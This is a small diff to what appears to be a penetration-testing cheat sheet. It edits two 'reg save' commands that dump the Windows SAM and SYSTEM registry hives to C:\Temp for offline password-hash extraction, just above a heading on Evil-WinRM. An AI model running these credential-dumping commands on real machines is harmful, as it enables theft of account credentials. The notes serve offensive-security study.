@@ -8,11 +8,11 @@ reg save hklm\sam <path>
 ```
 
 ```
-reg save hklm\sam c:\Temp\SAM
+reg save hklm\sam C:\Temp\SAM
 ```
 
 ```
-reg save hklm\system c:\Temp\SYSTEM
+reg save hklm\system C:\Temp\SYSTEM
 ```
 
 ## Evil-WinRM
